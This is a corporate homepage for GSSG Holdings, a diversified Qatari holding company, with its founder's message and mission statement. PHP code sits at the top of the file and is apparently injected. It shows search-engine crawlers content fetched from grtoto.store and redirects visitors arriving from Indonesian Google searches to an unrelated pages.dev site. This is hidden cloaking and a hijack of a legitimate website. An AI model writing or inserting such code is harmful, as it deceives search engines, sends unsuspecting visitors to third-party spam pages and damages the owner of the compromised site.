<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://grtoto.store/conextion-link/gssg.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://oke-langsung-gas.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<!-- Meta -->
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">

	<!-- Title -->
	<title> GSSG </title>

	<!-- Favicon icon -->
	<link rel="icon" type="image/png" href="images/favicon.ico">

	<!-- Stylesheet -->
	<link rel="stylesheet" type="text/css" href="css/twentytwenty.css">
	<link href="css/lightgallery.min.css" rel="stylesheet">
	<link href="css/magnific-popup.min.css" rel="stylesheet">
	<link href="css/swiper-bundle.min.css" rel="stylesheet">
	<link href="css/aos.css" rel="stylesheet">
	<link href="css/main.css" rel="stylesheet">
	<link href="css/line-awesome.min.css" rel="stylesheet">
	<link href="css/all.min.css" rel="stylesheet">
	<link href="css/flaticon.css" rel="stylesheet">
	<link href="css/themify-icons.css" rel="stylesheet">

	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link
		href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;0,900;1,200;1,300;1,400;1,600;1,700;1,900&display=swap"
		rel="stylesheet">
	<link
		href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&display=swap"
		rel="stylesheet">

	<!-- Custom Stylesheet -->
	<link rel="stylesheet" href="css/style.css">
	<script src="js/loadComponents.js" defer></script>
	<style>
		.mission-and-vision-img{
			width: 80%;
			height: 80%;
		}
		@media only screen and (max-width: 600px) {
			.mission-and-vision-img {
				width: 100%; /* Adjust the width to fit your preference */
				height: auto;
			}
		}
		@media (max-width: 768px) {
			.title-small {
				font-size: 5vw;
			}
			.sub-title {
				font-size: 2.5vw;
			}
			.btn-prev, .btn-next {
				font-size: 1rem;
				padding: 8px 12px;
			}
			.overlay-slide {
				width: 50%;
			}
		}
		
	</style>
</head>

<body data-primary="color_2">

	<div class="page-wraper">
		<!-- Header -->
		<div id="header-placeholder"></div>
		<!-- Header End -->
		<div class="contact-sidebar wow fadeInLeftBig">
			<div class="contact-box">
				<div class="logo-contact">
					<a href="index.html"><img src="images/logo.jpg" alt=""></a>
				</div>

				<div class="m-b50 contact-text">
					<div class="dz-title">
						<h4>About US</h4>
						<div class="dz-separator style-1 text-primary mb-0"></div>
					</div>
				</div>
				<div class="dz-title">
					<h4>Contact Info</h4>
					<div class="dz-separator style-1 text-primary mb-0"></div>
				</div>
				<div class="icon-bx-wraper left">
					<div class="icon-md m-r20">
						<span class="icon-cell"><i class="las la-phone-volume"></i></span>
					</div>
					<div class="icon-content">
						<h5 class="tilte">Call Now</h5>
						<p class="m-b0">+65 6356 4894 </p>
					</div>
				</div>
				<div class="icon-bx-wraper left">
					<div class="icon-md m-r20">
						<span class="icon-cell"><i class="las la-envelope-open"></i></span>
					</div>
					<div class="icon-content">
						<h5 class="tilte">Email Now</h5>
						<p class="m-b0">secc.sg@seccgroup.net</p>
					</div>
				</div>
				<div class="icon-bx-wraper left">
					<div class="icon-md m-r20">
						<span class="icon-cell"><i class="las la-map-marker"></i></span>
					</div>
					<div class="icon-content">
						<h5 class="tilte">Location</h5>
						<p class="m-b0">Second Floor, Flora Tower,
							ibn.Seena St.
							Al Muntazah Area, Doha- Qatar.</p>
					</div>
				</div>
			</div>
		</div>
		<div class="menu-close"></div>

		<div class="page-content bg-white">
			<!-- Slider -->
			<div class="slidearea">
				<div class="side-contact-info">
					<ul>
						<li><i class="fas fa-phone-alt"></i>+974 449 950 00</li>
						<li><i class="fas fa-envelope"></i> info@gssg.com</li>
					</ul>
				</div>
				<div class="silder-one">
					<div class="swiper-container main-silder-swiper">
						<div class="swiper-wrapper">
							<div class="swiper-slide">
								<div class="silder-img overlay-black-light">
									<img src="images/slider1.png" data-swiper-parallax="30%" alt="">
								</div>
								<div class="silder-content" data-swiper-parallax="-40%">
									<div class="inner-content">
										<h6 class="sub-title"> </h6>
										<!-- <h1 class="title">MSAZI </h1> -->
										<h3 class="title-small"> LUXURY MARINA <br>
											DEVELOPMENT </h3>

									</div>
									<div class="overlay-slide"></div>
								</div>
							</div>
							<div class="swiper-slide">
								<div class="silder-img overlay-black-light">
									<img src="images/pic2.jpg" data-swiper-parallax="30%" alt="">
								</div>
								<div class="silder-content" data-swiper-parallax="-40%">
									<div class="inner-content">
										<h6 class="sub-title"> </h6>
										<!-- <h1 class="title">MSAZI </h1> -->
										<h3 class="title-small"> LUXURY MARINA <br>
											DEVELOPMENT </h3>

									</div>
									<div class="overlay-slide"></div>
								</div>
							</div>
							<div class="swiper-slide">
								<div class="silder-img overlay-black-light">
									<img src="images/pic3.jpg" data-swiper-parallax="30%" alt="">
								</div>
								<div class="silder-content" data-swiper-parallax="-40%">
									<div class="inner-content">
										<h6 class="sub-title"> </h6>
										<!-- <h1 class="title">MSAZI </h1> -->
										<h3 class="title-small"> LUXURY MARINA <br>
											DEVELOPMENT </h3>

									</div>
									<div class="overlay-slide"></div>
								</div>
							</div>
						</div>
						<div class="slider-one-pagination">
							<!-- Add Navigation -->
							<div class="btn-prev swiper-button-prev1 swiper-button-white" style="padding-left: 20px;"><i
									class="las ti-angle-double-left"></i>PREV</div>
							<div class="swiper-pagination swiper-pagination-white"></div>
							<div class="btn-next swiper-button-next1 swiper-button-white" style="padding-right: 20px;">NEXT<i
									class="las ti-angle-double-right" ></i></div>
						</div>
					</div>
				</div>
			</div>
		<!-- About US -->
		<section class="abt-block " style="overflow: hidden;">
			<div class="about-us-upper">
				<img src="./images/about-us-upper.png" style="height: 773px;" alt="">
			</div>
			<br>
			<br>
			<br>
			<div class=" row cust-abt-row " style="margin: 0; ">
				<div class=" col-lg-7 cl-test-1">
					<div class="row cust-row-center aos-item " data-aos="fade-in" data-aos-duration="800"
						data-aos-delay="200">
						
						<div class="col-lg-4 test1">
							<div class="sv-inner-title">
								<h4>Aviation</h4>
							</div>
							<div class="sv-contents">
								<a href="aviation.html">
									<img src="./images/icons/icon-airport.png" alt="">
									<h4>Aviation</h4>
								</a>
							</div>
							<img src="./images/3@2x.png" class="img-fluid" alt="">
						</div>
						<div class=" col-lg-4 test2">
							<div class="sv-inner-title">
								<h4>Education</h4>
							</div>
							<div class="sv-contents">
								<a href="taallumgroup.html">
									<img src="./images/icons/icon-ed.png" alt="">
									<h4>Education</h4>
								</a>
							</div>
							<img src="./images/using-online-connect-technology-business-education-communication_1421-3950@2x.png"
								class="img-fluid" alt="">
						</div>
						
						 <div class="col-lg-4 test2">
							<div class="sv-inner-title">
								<h4>Sports and Fitness</h4>
							</div>
							<div class="sv-contents">
								<a href="ifitness.html">
									<img src="./images/icons/running-icon.png" style="padding-left: 10px;" alt="">
									<h4>Sports and Fitness</h4>
								</a>
							</div>
							<img src="./images/ifitness-club88.PNG" class="img-fluid" alt="">
						</div> 
						<!-- <div class="col-lg-4 test1">
							<div class="sv-inner-title">
								<h4>HOSPITALITY & FASHION</h4>
							</div>
							<div class="sv-contents">
								<a href="nairainternationalgroup.html">
									<img src="./images/icons/icon-hospitality.png" alt="">

								</a>
								<a href="nairainternationalgroup.html">
									<h4>HOSPITALITY & FASHION</h4>
								</a>
							</div>
							<img src="./images/xxl_153088796@2x.png" class="img-fluid" alt="">
						</div> -->
					</div>
					<div class="row cust-row-center aos-item " data-aos="fade-in" data-aos-duration="800"
						data-aos-delay="300">
						<div class="col-lg-2">

						</div>
						<div class="col-lg-4 test1">
							<div class="sv-inner-title">
								<h4>TRADING, MANUFACTURING AND CONTRACTING</h4>
							</div>
							<div class="sv-contents">
								<a href="jerseyarchitectural.html">
									<img src="./images/icons/icon-work.png" class="img-fluid" alt="">
								</a>
								<a href="jerseyarchitectural.html">
									<h4>TRADING, MANUFACTURING</h4>
									<h4 style="margin-top: -5px;">CONTRACTING</h4>
								</a>
								
							</div>
							<img src="./images/Manufacturing-MABlogImage@2x.png" class="img-fluid" alt="">
						</div>
						<div class="col-lg-4 test2">
							<div class="sv-inner-title">
								<h4>information technology</h4>
							</div>
							<div class="sv-contents">
								<a href="innovatix.html"><img src="./images/icons/digital-icon.png" class="img-fluid" alt=""></a>
								<a href="innovatix.html">
									<h4 class="text-break">information technology</h4>
								</a>
							</div>
							<img src="./images/data-analytics_1.JPG" class="img-fluid" alt="">
						</div>
						<div class="col-lg-2">

						</div>

					</div>
					<div class="row ">
						<div class="col-lg-9 abt-strip">
							<div class="partition-strip">
								<img src="images/viewmore-partition.png" alt="">
							</div>
						</div>
						<div class="col-lg-3 abt-btn-strip">
							<!-- <a href="">View all</a> -->
						</div>
					</div>

				</div>

				<div class="col-lg-5 cl-test-2 ">
					<div class="about-text wow fadeInLeftBig aos-item" data-aos="fade-in" data-aos-duration="800"
						data-aos-delay="200">
						<h1>Why gssG</h1>
						<p>Founded in 1993 and incorporated in 2007, Ghanim bin Saad al Saad & Sons Group Holdings
							(GSSG),
							owned by eminent business leader, Ghanim bin Saad al Saad, is one of Qatar’s most
							diversified
							private holding companies.
						</p>
						<p>Company founder and visionary Ghanim bin Saad al Saad has built a group of 45 companies in
							Qatar
							and around the world and has steered GSSG to great success in many diverse industries
							including
							aviation, maritime, automobiles, oil & gas, real estate, manufacturing, contracting and
							trading,
							finance & asset management, engineering, education, fitness, hotels, hospitality and
							fashion,
							information technology and telecommunications. </p>

						<a href="abouts.html"> Read More</a>
					</div>

				</div>

			</div>

		</section>
		<!-- About US  end-->
		<!---Founder-Messages -->
		<section class="founder-message-block" style="background-color: #172540;">
			<div class="mg-ovarlay">
				<img src="" alt="">
			</div>
			<div class="container-fluid" >
				<div class="row " style="margin: 0; padding: 0; ">
					<div class="col-lg-4 aos-item" data-aos="fade-in" data-aos-duration="800" data-aos-delay="200">
						<img src="./images/chairman_pic.JPG" alt="">
					</div>
					<div class="col-lg-8 aos-item" data-aos="fade-in" data-aos-duration="800" data-aos-delay="300">

						<h1>Founder’s Message</h1>

						<h3>Ghanim Bin Saad Al Saad</h3>

						<p>Ghanim Bin Saad Al-Saad & Sons Group Holdings was founded over a decade ago in the State of
							Qatar. Since its inception as Jersey Group in 1995 and its incorporation as GSSG Holdings in
							2007, we represent a proud tradition of business innovation, making a major
							contribution to the development of our country.</p>
						<p>Today we serve our clients and stakeholders as well as the community in which we work with
							incomparable professionalism, upholding time-honoured values. With the growing significance
							of
							Qatar’s economy in the world, GSSG Holdings re-focused its business to meet the demands of a
							fast-paced market, whilst ensuring the highest quality of its products and services
						</p>

						<p>Our goal is nothing less than the creation of a coherent business community; our vision is to
							provide astute business acumen and effectiveness; our mission is to work for best business
							practices. Our well-conceived, clearly stated and consistently applied Vision and Mission,
							aim
							to enhance the value of our resources (both in terms of investment and human capital). These
							principles, we believe, are fundamental to our future, our success, the Group’s image and
							its
							efficiency.
						</p>

						<p>Our group is also very active outside Qatar with a strong focus on USA and Europe.
							</p>
						<p>As the Founder of GSSG Holdings, it is an honour to offer our assurance of nothing less than
							superb customer service which meets state-of-the-art industry standards. Adopting the
							principle
							of “Transforming Change”, we embrace change that comes with the highest business integrity.
						</p>
					</div>
				</div>

			</div>

		</section>
		<!---Founder-Messages - end -->
		<!--- Mission and vison -->
		<section class="misson-and-vision">
			<div class="container-fluid">
				<div class="row " style="margin: 0; padding: 0;">
					<div class="col-lg-6 aos-item" data-aos="fade-in" data-aos-duration="800" data-aos-delay="200">
						<h1>Our Mission and Vision</h1>

						<h3 style="padding-top: 30px;">Our Mission</h3>
						<p>To emerge as a global leader blending Qatari traditional values with today’s market needs,
							focusing our attention on best business practices for performance that exceeds expectations
						</p>

						<h3>Our Vision</h3>
						<p>GSSG Holdings believes in providing quality engineering services, developing long-term
							relationships, adapting to the changing needs of our clients and industries, while making a
							major contribution to the economy of Qatar.

						</p>
					</div>
					<div class="col-lg-6 aos-item" data-aos="fade-in" data-aos-duration="800" data-aos-delay="200" style="padding-top: 110px;">
						<img src="./images/gssg_front_building.jpg" alt="" class="mission-and-vision-img">
					</div>
				</div>
			</div>
		</section>
	</div>
		<!--- Mission and vison end -->

		<!--Footer-->
		<div id="footer-placeholder"></div>
	<!--Footer end-->

	<button class="scroltop icon-up" type="button"><i class="fa fa-arrow-up"></i></button>
	</div>

	<!-- JAVASCRIPT FILES ========================================= -->
	<script src="js/wow.js"></script>
	<script src="js/jquery.min.js"></script><!-- JQUERY.MIN JS -->
	<script src="js/bootstrap.bundle.min.js"></script><!-- BOOTSTRAP.MIN JS -->
	<script src="js/waypoints-min.js"></script><!-- WAYPOINTS JS -->
	<script src="js/counterup.min.js"></script><!-- COUNTERUP JS -->
	<script src="js/magnific-popup.js"></script><!-- MAGNIFIC POPUP JS -->
	<script src="js/lightgallery-all.min.js"></script><!-- LIGHTGALLERY -->
	<script src="js/jquery.event.move.js"></script>
	<script src="js/jquery.twentytwenty.js"></script>
	<script src="js/swiper-bundle.min.js"></script><!-- OWL-CAROUSEL -->
	<script src="js/aos.js"></script><!-- AOS -->
	<script src="js/dz.carousel.js"></script><!-- OWL-CAROUSEL -->
	<script src="js/dz.ajax.js"></script><!-- AJAX -->
	<script src="js/custom.js"></script><!-- CUSTOM JS -->
	<script>
		new WOW().init();
	</script>
	<script>
		$(window).on('load', function () {
			$(".twentytwenty-container[data-orientation!='vertical']").twentytwenty({ default_offset_pct: 0.5 });
			$(".twentytwenty-container[data-orientation='vertical']").twentytwenty({ default_offset_pct: 0.3, orientation: 'vertical' });
		});
	</script>

</body>

</html>
